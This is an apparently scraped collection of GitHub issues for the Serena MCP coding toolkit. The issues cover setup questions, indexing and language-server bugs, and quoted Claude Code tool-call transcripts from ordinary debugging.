- Use a Ruby version manager (such as rbenv or rvm) for user-level gem installations.
- Install Solargraph using `sudo`, if appropriate.
- Configure Serena MCP or Solargraph to use a user-writable gems directory.

Please advise on the correct approach to resolve this issue or update documentation/instructions accordingly.

I've seen it use it a few times for file searches, but that's about it for the most part.

Am I doing something wrong? 

This is my MCP setup command:

`claude mcp add serena -- uvx --from git+https://github.com/oraios/serena serena-mcp-server --context ide-assistant --project $(pwd)`

And a few questions that might help get to the bottom of it:

- What is the purpose of --project flag? If I leave it off, it seems Serena operates the exact same way (but the difference being I can set it as a `--scope user` so I don't have to manually add it for every project folder I'm working in). So why specify --project? At first I thought it was because it meant we didn't need to say: ""read the initial instructions"" - but I think I might be wrong on that one.

- Do I need to say ""read the initial instructions"" if I add the MCP to local project using the --project flag?

- Do I need to say ""read the initial instructions"" every time I open Claude Code on my project? Or just the first time?

- Do I need to say it after every compact?

- I'm using Claude Code, docs say ""ide-assistant"" for the context flag. Is this still the recommended mode for Claude Code?

- Should I be using `--context agent` instead perhaps? With or without Agno (I've never tried Agno)? Can someone who actually has a good Claude Code setup provide information on the best practices.

- Is there something I need to do to get more value out of Serena and have Claude actually use it in a way that results in an improvement over the stock Claude Code? Like I said, Claude barely ever invokes it, and I'm not sure why. 

---

On a side note, my experiences here relate to my experiences using CLAUDE.md in general. I've tried to use CLAUDE.md in the past to give very specific instructions for optimization routines, but I found that they barely ever get used or listened to. So I'm trying to figure out is this an issue with the way I'm using Serena, or is this just par for the course and Claude Code just really isn't that great at following instructions or handling custom workflows or optimizations."

First of all love this tool! But I'm finding I have to quite and reload Claude Code 3 or 4 times per context window.

Occasionally it's because Claude tries to execute something that will hang forever. Then the timeout will kick in which is good.


But often it's just for a regex replace or a read file or search.

From the logs perspective it looks fine. Just the logs stop. And then have to restart Claude Code in order to get it to startup again. If I escape and cancel it is unable to re-establish connection or whatever also.

I tried adding the timeout hoping that would help things but it has only helped for interactive bash scripts like git diff that are hanging.

Again love the tool let me know if I can provide any other info that will help."

It seems like Serena set the JDK version to 21 at /serena/src/solidlsp/language_servers/eclipse_jdtls/runtime_dependencies.json

So some projects using JDK8 can no longer be built with Serena. Should this be a concern?"

● Now let me update the todo and then update the tests to verify this works correctly:

● Update Todos
  ⎿  ☒ Analyze and understand the directory flattening issue in batchWriteCode
     ☒ Modify batchWriteCode to preserve nested directory structure
     ☐ Update batch-write-code tests to verify nested directory preservation
     ☐ Test the fix with real workflow execution

● Now let me examine the existing tests and update them to verify the nested directory preservation:

● serena:find_symbol (MCP)(name_path: ""describe"", relative_path: ""apps/core/src/mastra/workflows/steps/batch-write-code.test.ts"", include_body: true, depth: 2)
  ⎿  []

  ⎿  The answer is too long (208644 characters). Please try a more specific tool query or raise the max_answer_chars parameter.

● Perfect! Now I understand the test structure. Let me add a specific test to verify nested directory preservation. I'll add it after the existing tests:

  ⎿  Error: MCP tool ""search_for_pattern"" response (51767 tokens) exceeds maximum allowed tokens (25000). Please use pagination, filtering, or limit parameters to reduce the response size.

● Let me look for the last test in the file:

● Let me try a more specific search for the actual test file:

> try reading the test file full content

● Let me read the full content of the test file to understand its structure and then add the nested directory test:

● serena:find_symbol (MCP)(name_path: """", relative_path: ""apps/core/src/mastra/workflows/steps/batch-write-code.test.ts"", include_body: true, max_answer_chars: 50000)

> without using  serena, get the full content of the test file

● Read(apps/core/src/mastra/workflows/steps/batch-write-code.test.ts)
  ⎿  Read 134 lines (ctrl+r to expand)

● Perfect! Now I can see the full test file structure. The file looks like legitimate test code and not malicious. Let me add a test to verify nested directory preservation. I'll add it before the closing

I read the comments about why you reset the sqlite db when the agent is restarted but I'm not sure I understand. I managed to get persistent session storage to work such that I could easily switch between models, restart the agent, and resume from where I left off. I did this by moving the db file from temp and no longer unlinking it. I also added an explicit agent id to allow it to be the same across restarts.

What's the drawback of doing it this way?"

1. Have a Laravel project, dockerized
2. Create a storage symlink (`php artisan storage:link`) inside the container
3. There will be a symlink in the `public` folder named `storage` which will point to `/your/app/storage/app/public`
4. Try to index the project with Serena - outside the Docker container, because who uses LLMs inside Docker containers anyway?
5. Face an error at this line: https://github.com/oraios/serena/blob/main/src/solidlsp/ls.py#L226

Any advice on this? Removing the symlink temporarily works, but obviously it's not a solution.

Also, if we are here already - do I have to reindex my files manually or will Serena take care of it sometimes? If I have to do it manually, how often? Thanks!"
oraios/serena,3166467953,220,serena:search_for_pattern (MCP) failing to find contents (I think we need to add extra instructions to Serena?),closed,2025-06-23T01:26:18Z,2025-06-24T00:45:03Z,[],nullbio,"I noticed when Claude was attempting to fix a html positioning bug, it attempted to do the following search using the serena search_for_pattern, however it failed to find anything. But then I noticed the grep was returning results. So I asked it to do a check, and this is what happened. Worked for grep, but not search_for_pattern:

```
● Let me test the Serena MCP search_for_pattern to see if it's working correctly.

● serena:search_for_pattern (MCP)(pattern: ""schedule-grid"", paths_include_glob: ""web/css/protocol.css"", only_in_code_files: true)
  ⎿  {}

● Let me try without the paths_include_glob to see if it finds it:

● serena:search_for_pattern (MCP)(pattern: ""schedule-grid"", only_in_code_files: true)
  ⎿  {
       ""web/protocol-sections/convenient.php"": [
         ""  >  62:<div class=\""schedule-grid\"" style=\""grid-template-columns: 1fr 1fr; max-width: 800px; margin: 0 auto 3rem;\"">""
     … +5 lines (ctrl+r to expand)

● It seems the issue is with the paths_include_glob parameter. Let me try a different pattern:

● serena:search_for_pattern (MCP)(pattern: ""schedule-grid"", paths_include_glob: ""**/*.css"", only_in_code_files: true)
  ⎿  {}

● Let me check what files actually exist:

● Bash(find /home/null/projects/bk-name ""*.css"" -type f | grep -v node_modules)
  ⎿  /home/null/projects/bk/web/css/theory.css
     /home/null/projects/bk/web/css/protocol-professional.css
     /home/null/projects/bk/web/css/protocol.css
     … +5 lines (ctrl+r to expand)

● Let me verify the content is actually there:

● Bash(grep -n ""schedule-grid"" /home/null/projects/bk/web/css/protocol.css | head -5)
  ⎿  585:.schedule-grid {
     594:  .schedule-grid {

● The content is definitely there. It seems like the Serena MCP search_for_pattern tool might have an issue with the paths_include_glob parameter when it's too specific or doesn't match the expected pattern format.

  The issue appears to be that:
  1. When I used paths_include_glob: ""web/css/protocol.css"", it didn't find anything
  2. When I used paths_include_glob: ""**/*.css"", it also didn't find anything
  3. But when I didn't use paths_include_glob at all, it found the pattern in PHP files

  This suggests that the paths_include_glob parameter might not be working as expected for CSS files, or it might require a different glob pattern format. The tool seems to work fine without the path restriction, but has
  issues when trying to limit the search to specific files or file types.
```

I noticed the params used, and so I asked the following. Seems this is the issue:

Prompt:
```
How is search_for_pattern documented to work? I see you have only_in_code_files set as true, does that include css files?
```

```
● Let me check the documentation for the search_for_pattern tool:
  ⎿  Have you collected all the information you need for solving the current task? If not, can the missing information be acquired by using the available tools,
     in particular the tools related to symbol discovery? Or do you need to ask the user for more information?
     Think about it step by step and give a summary of the missing information and how it could be acquired.

● Let me look at the initial instructions to see how search_for_pattern is documented:
  ⎿  You are a professional coding agent concerned with one particular codebase. You have
     access to semantic coding tools on which you rely heavily for all your work, as well as collection of memory
     files containing general information about the codebase. You operate in a frugal and intelligent manner, always
     … +168 lines (ctrl+r to expand)

● The documentation doesn't explicitly define what ""code files"" means for the only_in_code_files parameter. Let me check if CSS files are being excluded:

● serena:search_for_pattern (MCP)(pattern: ""schedule-grid"", only_in_code_files: false)
  ⎿  {
       ""web/css/protocol.css"": [
         ""  > 585:.schedule-grid {"",
     … +9 lines (ctrl+r to expand)

● Ah! There's the issue. When only_in_code_files is set to true, it appears to exclude CSS files. When I set it to false, it finds the pattern in the CSS file.

  So the answer is: CSS files are NOT considered ""code files"" by the search_for_pattern tool when only_in_code_files is true. To search in CSS files, you need to either:
  1. Set only_in_code_files to false, or
  2. Omit the parameter entirely (which likely defaults to false)

  This explains why grep worked but the MCP search didn't - I was inadvertently filtering out CSS files by using only_in_code_files: true.
```

So apparently Claude is incorrectly using only_in_code_files for files like css files. I take it this is something that needs to be updated in the serena MCP instructions so Claude does not make this mistake again? Do we need additional params, like `only_in_style_files`, to make this nicer? What's the best way to handle this?

**One last thing.** Is this param set to true by default? Because if it's not specified by Claude explicitly as false and is left off, it also fails to find the css files. "

 _Originally posted by @MischaPanch in [#208](https://github.com/oraios/serena/issues/208#issuecomment-2994283549)_

I have a monorepo project with both Java and Typescript. Java is the dominant language by far. The Java project is 21 with preview features enabled, specifically virtual threads.

I prep the environment before using Claude Code with `uvx --from git+https://github.com/oraios/serena index-project` which successfully indexes the Java project.

I am seeing this error right before the timeouts start. I have redacted the actual file as `redacted.file.java`

  ## Steps to Reproduce
  1. Run: `uvx --from git+https://github.com/oraios/serena index-project`
  2. Command fails with ModuleNotFoundError

  ## Error Output
  Traceback (most recent call last):
    File ""/home/claude-user/.cache/uv/archive-v0/YNyKqgiEICD_3FF3G59nS/bin/index-project"", line 6, in
      from serena.agent import index_project
    File ""/home/claude-user/.cache/uv/archive-v0/YNyKqgiEICD_3FF3G59nS/lib/python3.11/site-packages/serena
  /agent.py"", line 59, in
      from solidlsp.ls import SolidLanguageServer
  ModuleNotFoundError: No module named 'solidlsp'

  ## Environment
  - Python: 3.11.2
  - uv: 0.7.13
  - OS: Linux 6.8.0-57-generic
  - Installation method: uvx

  ## Additional Context
  This also causes the MCP server to fail when used with Claude Code, resulting in ""Connection closed""
  errors."
oraios/serena,3165822008,215,Improve documentation for conversation continuation workflow,closed,2025-06-22T09:56:26Z,2025-08-02T10:47:32Z,[],rubenfonseca,"## Problem

The current documentation for continuing conversations after running out of context is incomplete and confusing.

In the README (lines 662-672), the workflow is described as:
1. Use `prepare_for_new_conversation` tool
2. Write summary to memory using `write_memory` 
3. ""Then, in a new conversation, you can just ask Serena to read the memory and continue with the task""

However, the documentation doesn't specify:
- **Which memory to read** - how would a user know which memory contains their task context?
- **How to identify the right memory** among potentially many memories
- **Naming conventions** for continuation memories

## Current Gap

The phrase ""read the memory"" assumes users will remember the exact memory name they used, which isn't realistic for complex workflows.

## Suggested Improvements

1. **Clarify the continuation workflow**:
   - Specify that users should use `list_memories` first in new sessions
   - Explain how to identify task-specific memories

2. **Recommend naming conventions**:
   - Suggest descriptive names like `task_implement_feature_x_progress`
   - Maybe prefix continuation memories with `continuation_` or `task_`

3. **Consider workflow enhancements**:
   - Perhaps a dedicated continuation memory type
   - Automatic naming based on task context
   - A `continue_task` command that handles memory lookup

## Impact

This documentation gap makes the conversation continuation feature less usable and may lead users to think the feature doesn't work properly."

Do you have instructions for onboarding a monorepo with multiple languages? I am using Claude code.  My first attempt indexed the parent directory and nothing in the backend. The second attempt to onboard indexed the backend directory and that works, but only in the backend. I can get the same results for the frontend.  It would be great to be able to use Serena on both the frontend and backend at the same time.

This is my first day using it and I'm testing it first by indexing a project. 

I came here in issues and found other people complaining about this recent issue.

so I decided to rerun the indexing again to find out that it stuck at the same file.

I decided to cancel to share the error and I can share the file if that may help you.

oraios/serena,3164441290,204,TypeScript and JavaScript ESM suffixes,closed,2025-06-20T21:53:04Z,2025-06-23T19:06:04Z,[],shawnmcknight,"I have an ESM based TypeScript project which uses `.mts` suffixes for the file names. When trying to index this project it fails to detect a language. If I create a project.yml file that specifies the language, the indexing errors out. After seeing it mentioned in a different issue regarding a problem with use of `.tsx` suffixes, I speculate that the problem might be here https://github.com/oraios/serena/blob/162d3c81d3546a681a470ac93327b41918844a78/src/multilspy/multilspy_config.py#L51 since there is no indication of the alternative TypeScript and JavaScript suffixes for ESM and CJS format. `.cjs` and `.mjs` are valid JavaScript suffixes and `.cts` and `.mts` are valid TypeScript suffixes (see https://www.totaltypescript.com/concepts/mjs-cjs-mts-and-cts-extensions). I was previously unaware of this, but apparently all of those also support the `x` trailing character as well. So effectively the extensions should be:

**JavaScript**
- .js
- .jsx
- .cjs
- .cjsx
- .mjs
- .mjsx

**TypeScript**
- .ts
- .tsx
- .cts
- .ctsx
- .mts
- .mtsx
- Plus all of the JavaScript extensions

I'm unsure if this is the cause of my problem, but indexing is proceeding successfully in a separate project that uses `.ts`, `.js`, and `.jsx` suffixes so it felt like a reasonable speculation."

When I try to add serena to other projects, it works just fine. FYI I am using WSL2 here. I follow the exact same instructions to add the mcp server but it only fails with one particular project. For the other projects, my browser window opens normally and I see the Serena dashboard, but if I try to start it with one specific project, I receive the following output (with Claude debug mode enabled) and Serena fails to start (and I don't see the browser open with the dashboard either). I am really baffled as to why this is happening and why only on a specific project. The other projects are based on PHP/Typescript too, but I don't have this particular issue there. The only difference here is perhaps that it uses Vue JS, but that shouldn't let the MCP crash right?

oraios/serena,3162604281,197,Parsing gitignore files takes a long time,closed,2025-06-20T09:41:03Z,2025-06-20T12:01:56Z,[],nb-rubenoost,"I've noticed parsing the gitignore files takes a long time and the process just quits itself after that.

I just run it like `serena-mcp-server  --context ide-assistant --project /path` on a very large dotnet codebase.

I've been able to solve this by replacing this (in `src/serena/util/file_system.py`):

```python
def _find_gitignore_files(self) -> list[str]:
    """"""
    Find all .gitignore files in the repository.

    :return: List of absolute paths to .gitignore files
    """"""
    gitignore_files = []

    for root, dirs, files in os.walk(self.repo_root):
        # Skip .git directory
        if "".git"" in dirs:
            dirs.remove("".git"")

        if "".gitignore"" in files:
            gitignore_path = os.path.join(root, "".gitignore"")
            gitignore_files.append(gitignore_path)

    return gitignore_files
```

by this

```python
def _find_gitignore_files(self) -> list[str]:
    """"""
    Find all .gitignore files tracked by Git in the repository.
    
    :return: List of absolute paths to .gitignore files
    """"""
    # Run `git ls-files` to get all tracked files
    output = subprocess.check_output(
        [""git"", ""-C"", self.repo_root, ""ls-files"", "".gitignore"", ""**/.gitignore""],
        stderr=subprocess.DEVNULL,
        text=True
    )
    # Split and convert to absolute paths
    gitignore_files = [
        os.path.abspath(os.path.join(self.repo_root, line.strip()))
        for line in output.splitlines()
        if line.strip()
    ]
    return gitignore_files
```

It seems like the recursive search for `.gitignore` files also checks ignored folders with many, many, artifacts. I have 0 experience with python, so I am not sure if this is a reasonable solution, but I hope this helps someone and might inspire an actual fix in the project."
oraios/serena,3162600247,196,SSE Transport Mode Fails with Dynamic Client Registration Error,open,2025-06-20T09:39:53Z,2025-06-29T09:57:14Z,[],patrickrho,"## Problem Description

When running multiple Claude Code instances (multiple terminals with `claude`), each instance spawns its own Serena MCP server process. For large codebases, this leads to significant RAM consumption as each server instance loads the entire project context into memory. This becomes unsustainable when running multiple Claude Code sessions in parallel.

### Current Behavior (stdio mode)
- Each Claude Code instance starts its own Serena MCP server
- Multiple parallel sessions = multiple server instances
- Large codebases consume substantial RAM per instance

### Attempted Solution (SSE mode)
Tried to use SSE transport mode to have multiple clients connect to a single server instance, but encountering an error that prevents the server from working.

## Steps to Reproduce

1. Start Serena MCP server in SSE mode:
```bash
uv run serena-mcp-server --transport sse --port 9121 --context ide-assistant --project /path/to/large/project
```

2. Server starts successfully:
```
INFO: Started server process [79602]
INFO: Waiting for application startup.
INFO: Application startup complete.
INFO: Uvicorn running on http://0.0.0.0:9121 (Press CTRL+C to quit)
```

3. Configure Claude Desktop to connect via SSE:
```json
{
  ""mcpServers"": {
    ""serena"": {
      ""type"": ""sse"",
      ""url"": ""http://localhost:9121""
    }
  }
}
```

4. Connection attempt fails with:
```
INFO: 127.0.0.1:60690 - ""GET / HTTP/1.1"" 404 Not Found
INFO: 127.0.0.1:60722 - ""GET /.well-known/oauth-authorization-server HTTP/1.1"" 404 Not Found
INFO: 127.0.0.1:60725 - ""POST /register HTTP/1.1"" 404 Not Found
--- From Claude Code logs
│ Status: ✘ failed
│ URL: http://localhost:9121
│ Error: Dynamic client registration failed: HTTP 404
```

## Expected Behavior

SSE mode should allow multiple Claude Code/Claude Desktop instances to connect to a single Serena MCP server, reducing overall memory consumption.

## Impact

This issue is critical for users who:
- Work with large codebases
- Run multiple Claude Code sessions in parallel
- Have multiple Anthropic accounts and use them simultaneously
- Need to manage RAM consumption on their development machines

 _Originally posted by @peter-si in [#172](https://github.com/oraios/serena/issues/172#issuecomment-2976771017)_

At least for Claude Code, we should fix this. 

There is another problem, possibly related - Claude Code will sometimes list the tools twice, probably due to our update mechanism. So it will list 66 mcp tools. Claude Desktop doesn't do that... The duplication is however not a severe issue, it can use the tools just fine.

Since Claude Code and other similar systems will never require project changes (the MCP config there is on a per-project basis, and thus should always be configured to activate the current project on start, I will add that to the readme), we can rethink our tool updating mechanism. At least claude should probably never see the tools excluded by the context, this will help with the confusion.

The culprit code is in mcp.py, the tool listing and updating mechanism (it's documented there)"

I am finding the prompts for memory are too generic, and some tools' prompts can be improvised.
But since I use serena using `uvx` directly from the github repository which copies the serena repository in a temp directory, I cannot edit the files in config/**/*.yml to customize the prompts.

Requirement
* copy the config files to a user config directory like `~/.local/share/serena/` for linux ( may use [platformdirs](https://pypi.org/project/platformdirs/) ) and read the configs from there
* (Optional if above is implemented) Provide a CLI argument to read config from a custom directory"

I have to restart to continue even though the command has been successfully executed. My current workaround (partly successful) has been to develop some ""shell command protocols"" and use my QDRANT memory store to have Claude Desktop try and remember to follow these protocols. So long as it does then my workflow is uninterrupted. However, it will inevitably suddenly stop following these protocols and a restart is necessary. Is tis the same as the zombie processes issue referred to in the README file? One idea I had was making sure that Serena only executes shell commands where output is always provided (i.e. ""server successfully started"" or ""server failed to start"" etc.) although I am sure you have thought of that already.

To use OpenRouter and Serena with Agno.

# Observation

![Image](https://github.com/user-attachments/assets/107219ac-7629-493d-bac3-0ef77db9bcb6)

This is confusing, because it seems to me that the Serena + Agno documentation in the README must not work for anyone, since only Claude and Gemini are configured out of the box.

# Expected
README instructions for Agno + Serena should work with models other than OpenAI. 

# Investigation
1. This seems to be caused by AgentMemory not supporting any models other than OpenAI-like models.
https://github.com/agno-agi/agno/issues/2607#issuecomment-2766530032

2. Serena is currently using agno `1.2.15` but the latest agno version is ` 1.5.6` which uses memory in a different way that *seems* to allow specification of the model. https://docs.agno.com/agents/memory#show-me-the-code%3A-memory-%26-storage-in-action

# Attempted Remediation
1. Attempted to specify OpenRouter with ""openai/o3"", but `AgentMemory` reaches for OpenAI by default, using the env `OPENAI_API_KEY` directly.
2. Attempted to modify `SerenaAgnoAgentProvider` to specify the OpenRouter model into the `classifier` argument of Agent, but no cigar.
3. Added OpenRouter model simultaneously for `classifier`, `summarizer`, and `manager`.
4. Updated agno to `1.5.6` and made the appropriate changes to `src/serena/agno.py` to use the supplied model.
5. Removed `memory` from Agent and set `enable_agentic_memory` to False. "

oraios/serena,3099711675,133,insert_after_symbol tool consistently fails due to overly strict location matching after `end_line` enhancement,closed,2025-05-29T09:17:55Z,2025-05-29T10:19:37Z,[],chknd1nner,"# insert_after_symbol tool consistently fails due to overly strict location matching after `end_line` enhancement

## Problem Description

The `insert_after_symbol` tool (and likely `insert_before_symbol`) consistently fails to find symbols, returning ""Symbol not found or has no defined location within a file"" even when provided with correct symbol coordinates from `find_symbol` results.

## Root Cause

This regression was introduced by the `end_line` enhancement in commit `6c12183` where `end_line` was added to the `SymbolLocation` dataclass. The issue is in the `SymbolManager.find_by_location()` method, which now performs exact matching on ALL fields including `end_line`.

### The problematic flow:

1. User calls `insert_after_symbol` with location: `SymbolLocation(path, line, column, end_line=None)`
2. `find_by_location()` queries symbols and gets: `SymbolLocation(path, line, column, end_line=1695)`
3. Exact equality comparison fails: `None != 1695`
4. Method returns `None`, tool reports ""Symbol not found""

## Steps to Reproduce

```python
# 1. Find a symbol (this works)
result = find_symbol(""SomeClass"")  # Returns symbol at line 100, column 4

# 2. Try to insert after it (this fails)  
insert_after_symbol(""src/file.py"", 100, 4, ""new code"")
# Returns: ""Symbol not found or has no defined location within a file""
```

## Expected vs Actual Behavior

**Expected**: Tools should work with partial location information (just start position) since users typically don't know/care about end positions for insertion operations.

**Actual**: Tools fail because they require exact location matching including `end_line`.

## Proposed Solution

Modify `SymbolManager.find_by_location()` to use more lenient matching logic:

```python
def find_by_location(self, location: SymbolLocation) -> Symbol | None:
    if location.relative_path is None:
        return None
    symbol_dicts, roots = self.language_server.request_document_symbols(location.relative_path, include_body=False)
    for symbol_dict in symbol_dicts:
        symbol = Symbol(symbol_dict)
        if self._locations_match(location, symbol.location):  # Use custom matching
            return symbol
    return None

def _locations_match(self, search_loc: SymbolLocation, symbol_loc: SymbolLocation) -> bool:
    """"""Match locations, ignoring end_line when not specified in search.""""""
    if search_loc.relative_path != symbol_loc.relative_path:
        return False
    if search_loc.line != symbol_loc.line:
        return False
    if search_loc.column != symbol_loc.column:
        return False
    # Only compare end_line if explicitly provided in search location
    if search_loc.end_line is not None and search_loc.end_line != symbol_loc.end_line:
        return False
    return True
```

## Impact

This affects all symbol insertion/editing tools that rely on user-provided locations:
- `insert_after_symbol` 
- `insert_before_symbol`
- `replace_symbol_body`

## Additional Context

The `end_line` enhancement was valuable for providing complete location information to LLMs, but the equality comparison logic wasn't updated to handle backward compatibility with partial location specifications.

The tools worked fine before this enhancement because location matching was effectively limited to `(relative_path, line, column)` which is sufficient for identifying symbol start positions."

This results in an error because the read_file tool says that it expects a parameter named ""path"", not ""relative_path"".

There must be a problem with the way the tool gets registered with MCP.

I can see the make_tool tool, uses the docstring to supply the correct parameters when registering the tool, and the docstring of the apply method of the readFile class clearly states ""relative_path"". Yet the tool has been registered expecting ""path"" as the parameter name.

I have been unable to determine why this discrepancy exists."

`insert_after_symbol` (and likely `insert_before_symbol`) occasionally pastes the snippet **on the same line** as the target symbol, instead of starting on a fresh line. This happens in several observed cases.

Always prepend/append the inserted fragment with **one leading newline**:

This guarantees the new block starts on its own line.

For example, one can't pass `find_symbol(""Foo.__init__"")` or the likes of it and would always need multiple calls for finding symbol information. We also can't reference a symbol by id, and LLMs can have a hard time getting the right line and column. Language servers often don't give the selectionRange that can be directly used to reference a symbol, which led us to introduce a dirty hack in the go LS implementation. We could allow just passing the line (then, by default, choosing the first symbol on that line) or a suitable id for finding symbol references.

We should also try out whether adding more examples for symbolic operations to the instructions/system-prompt or the tool descriptions helps."

So I notices something interesting. With this [PR](https://github.com/oraios/serena/pull/36) the list_dirs tool filters files based on language, so it will not return any files other than python if this is python language.

If the agent lists a folder, it cannot find a file. Then it gets stuck, as in the example (git gemini-2-flase). In this case (instructions.md) is in root folder:

<img width=""862"" alt=""Image"" src=""https://github.com/user-attachments/assets/41948e65-a9d1-4952-a793-18435bc6af98"" />

If I add a ""raw_files"" and list the files, the agent can see them. I don't know what would be the best way to both ignore files when thinking of programming and when the list_dir tool is used for exploratory purpose.

Here is an example that works, where list of files is empty but we also return raw_files (before filtered by language server) gives the context to llm:

I’m currently working on a custom LSP setup for Serena, using the Intelephense LSP for PHP. I’d like to include additional file types—specifically .xml, .json, and .phtml.

Could you help me figure out which files or settings I need to modify to support these extra extensions?

- Operating System: macOS 15.4
- Python Version: 3.11.12 (installed via Homebrew)
- Virtual Environment Tool: `uv`
- Project Version: Tested on commit `8c9fd74` (latest main as of 2025-04-10 in the provided history)

**Steps to Reproduce:**

1. Set up the project environment using `uv` (or potentially other environment managers) with Python 3.11.12 installed via Homebrew on macOS.

2. Attempt to start the MCP server using the command:

   Bash

   ```
   uv run serena-mcp-server
   ```

**Expected Behavior:**

The `serena-mcp-server` should start successfully without errors.

**Actual Behavior:**

The command fails immediately with a `ModuleNotFoundError`, indicating that the `_tkinter` module cannot be found.

    import _tkinter # If this fails your Python may not be configured for Tk
    ^^^^^^^^^^^^^^^
ModuleNotFoundError: No module named '_tkinter'
```

**Additional Context:**

- The error occurs because `serena.gui_log_viewer` attempts to import `tkinter`.
- Python installations, especially those not bundled with the OS (like Homebrew versions on macOS), may not include Tk support by default or might require separate installation of Tcl/Tk libraries (`brew install tcl-tk`).
- It might be worth considering if `tkinter` (and thus the `GuiLogViewer`) should be an optional dependency for the core server functionality, or if the requirement for Tk support should be explicitly documented in the setup instructions, especially for macOS/Linux users.

- OS: Windows 10
- Claude Desktop: Latest
- Python: 3.11.x (Installed on Windows, accessible via PATH)
- Node.js: v22.x (Installed on Windows, accessible via PATH)
- npm: 11.x (Installed on Windows, accessible via PATH)
- uv: Installed on Windows, accessible via PATH

**Configuration**:

`claude_desktop_config.json`: Configured to run Serena directly on Windows using `uv.exe`:

```
{
    ""mcpServers"": {
        ""serena"": {
            ""command"": ""C:\\path\\to\\uv.exe"", // Verified path to Windows uv.exe
            ""args"": [
                ""run"",
                ""--directory"",
                ""C:\\path\\to\\serena_code"", // Path to Serena source code
                ""serena-mcp-server"",
                ""C:\\path\\to\\serena_code\\project_config.yml"" // Path to project YML
             ]
        }
    }
}
```

**Expected Behavior**:

- uv creates a Windows-compatible `.venv` in `C:\path\to\serena_code`.
-  Serena starts successfully.
- Serena launches the bundled TypeScript Language Server (TS LSP).
- The TS LSP initializes successfully and responds to Serena's internal handshake.
- Serena completes its initialization and responds to Claude Desktop's initialize request.
- The connection succeeds, and tools become available in the Claude Desktop UI.

**Actual Behavior**:

- uv creates the .venv successfully.
- Serena starts successfully.
- Serena launches the bundled TS LSP process (...\typescript-language-server --stdio).
- Serena logs that it is sending the initialize request to the TS LSP and awaiting a response.
- No response is received from the TS LSP within 60 seconds.
- Claude Desktop logs show notifications/cancelled with reason: ""Error: MCP error -32001: Request timed out"" for the initial request (ID 0).
- Claude Desktop disconnects from the Serena server. The Serena server process terminates.

**project_config.yml**

```
project_root: `C:\\path\\to\\my_typescript_project` # Windows path to the TS project
language: typescript
ignored_dirs: ["".git"", "".vscode"", ""node_modules"", ...] # node_modules excluded
gui_log_window: False
# ... other settings ...
```


**Steps to Reproduce**:

- Ensure all prerequisites (Python, Node, npm, uv) are installed on Windows and in PATH.
- Ensure the target TypeScript project exists at project_root and has its dependencies installed via npm install in that directory (i.e., C:\path\to\my_typescript_project\node_modules exists).
- Ensure the Serena source code exists at C:\path\to\serena_code.
- Delete any existing .venv directory within C:\path\to\serena_code to ensure a fresh environment creation.
- Configure claude_desktop_config.json and project_config.yml as shown above.
- Restart Claude Desktop.
- Observe the connection attempt to the ""serena"" MCP server.


**Log Snippet** **(stderr from Serena process)**:

```

Creating virtual environment at: .venv
Installed 40 packages in ~1-2s
INFO  ... multilspy:log:64 - Starting TypeScript server process

# --- NO FURTHER LOGS FROM LSP OR MULTILSPY UNTIL TIMEOUT ---
# --- approx. 60 seconds pass ---
# --- Claude Desktop disconnects ---
```


**Additional Context**:

The issue occurs consistently even after deleting `.venv` and reinstalling Serena's Python dependencies via `uv`.

The issue occurs even after deleting node_modules within the TS LSP's own directory (`C:\path\to\serena_code\src\multilspy\...\static\ts-lsp\`) and reinstalling via `npm` install.

The target TypeScript project (`C:\path\to\my_typescript_project`) opens and initializes quickly with TypeScript language features in VS Code running natively on Windows, suggesting the project itself is not inherently problematic for standard TS tooling.

The timeout seems fixed at 60 seconds by the Claude Desktop client.

**Possible Cause**: The bundled typescript-language-server within Serena, or the multilspy component's interaction with it, appears unable to complete initialization for the specified TypeScript project within the 60-second timeout period, despite standard tooling like VS Code working correctly.

Has anyone successfully setup Serena with typescript? I have tried using it with the java server (on the same machine) without any issues."

I THINK it decided that only replacing a certain part of code is not enough, so it tried to create a new version of the file, which was too long for Claude, so I had to type Continue but instead of continuing with the creation of the file, it started writing it from scratch, falling into an infinite loop. In this point, I was forced to start a new chat because of running out of context. So there was a modified file, new unfinished file and no updated memories about this. This happened on multiple occasions.

I apologize if you know about this already. I know it's probably Claude Desktop specific, so it might not be your top priority, but these two shortcomings make using Serena with any bit larger project unusable and only deplete usage ration.

oraios/serena,2974279785,26,search_in_all_code takes too long and often fails in Claude Desktop,closed,2025-04-05T15:21:29Z,2025-04-06T18:47:03Z,[],shyraptor,"In Claude Desktop, whenever search_in_all_code is invoked, it often takes several minutes or more to return results — if it succeeds at all. In most cases, the process hangs or fails, forcing the user to restart Claude Desktop and rephrase the original prompt to retry. The fallback behavior is unreliable: if a specific search fails, Claude tends to retry with a broader or vaguer query, which often causes it to hang again or time out.

I suspect this might be related to a mismatch between the current codebase and what Serena has stored in memory. However, I’ll describe this in more detail in a #[separate issue](https://github.com/oraios/serena/issues/27)—as it deserves its own investigation.

Suggestion:
Introduce a secondary tool that triggers after a failed search, prompting the user to manually describe or locate the relevant code area instead of guessing again blindly.

oraios/serena,2971520532,21,BUG: Spaces in Project Path,closed,2025-04-04T07:27:11Z,2025-04-06T09:58:15Z,[],formeo14,"## Summary
The Serena language server fails to initialize when the project root path contains spaces, causing the MCP server to disconnect.

## Detailed Description
When attempting to start the Serena MCP server for a C# project located in a directory with spaces (e.g., ""Visual Studio""), the language server encounters a critical error during path resolution. 

### Steps to Reproduce
1. Create a project in a directory with spaces in its path
2. Configure Serena with the project configuration file
3. Attempt to start the Serena MCP server

### Example Problematic Path
```
C:\Library\Visual Studio\Develop\
```

### Current Behavior
- The server fails to initialize
- Throws a `NotADirectoryError`
- Terminates the MCP server connection

### Expected Behavior
The language server should:
- Correctly handle paths containing spaces
- Successfully locate and process the solution file
- Initialize the server without errors

### Root Cause
The current implementation of path handling in the language server does not properly escape or process paths with spaces, causing `os.listdir()` and other path-related operations to fail.

### Recommended Fixes
1. Implement robust path handling that:
   - Properly escapes spaces in file paths
   - Uses `os.path.normpath()` or similar methods to standardize path representation
   - Adds additional error checking for path resolution

2. Add explicit path validation and error handling
   - Check for path existence before attempting to list directory contents
   - Provide clear error messages about path-related issues

### Reproducibility
- Consistently reproducible
- Affects Windows systems with spaces in file paths

### Severity
- High: Prevents the MCP server from starting
- Blocks usage for users with standard Windows file organization"

## 1. Do We Need to Run `uv run serena-mcp-server myproject.yml`?
The setup instructions under **""Setup MCP Server for Claude Desktop""** mention configuring `claude_desktop_config.json` with the project YAML and `uv` path, but it’s not explicitly stated whether we need to manually run:

```sh
uv run serena-mcp-server myproject.yml
```

